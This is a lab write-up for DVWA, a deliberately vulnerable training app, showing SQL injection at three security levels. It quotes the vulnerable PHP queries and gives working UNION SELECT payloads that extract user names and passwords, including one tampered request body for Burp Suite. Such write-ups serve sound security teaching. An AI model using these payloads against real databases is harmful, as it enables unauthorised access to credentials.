# DVWA - SQL Injection

## Description

**Vulnerability:** SQL Injection    
**Impact:** Using vulnerability in SQL queries to get access to restricted data.

---

## LOW Security Level
The source code doesn't have any check on the input `id` it just pass the value to the query. We can easily use this payload to get tables list:

```
' UNION SELECT user, password FROM users #
```

Source code doesn't check anything:
```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

Result:
![Guide image](./screenshots/5.png)

## MEDIUM Security Level
The source code with the UI only enable us to choose `id` through a SELECT:
```php
// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
```

Besides this, there aren't any checks so we can easily intercept the request with Burp Suite and change the value of `id` with what we want.

However notice the difference the query uses number to access `id` therefore we can use this payload in Burp Suite:
```
id=0 UNION SELECT user, password FROM users%23&Submit=Submit
```
![Guide image](./screenshots/2.png)

Result:
![Guide image](./screenshots/1.png)

## HIGH Security Level
This is the updated `$query` of HIGH Security Level still doesn't have any checks
```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

The only difference is instead of use `id` param or body value it use session:
```php
// Get input
$id = $_SESSION[ 'id' ];
```
Click `Click here to change your ID.` it will popup a change id page. We can use this payload to get all passwords of users:
```
' UNION SELECT user, password FROM users #
```
![Guide image](./screenshots/3.png)

The `#` will help us make a comment to disable `LIMIT 1` and get all records in `users` table. Result:

![Guide image](./screenshots/4.png)

## Resources
- https://en.wikipedia.org/wiki/SQL_injection
- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
- https://owasp.org/www-community/attacks/SQL_Injection
- https://bobby-tables.com/
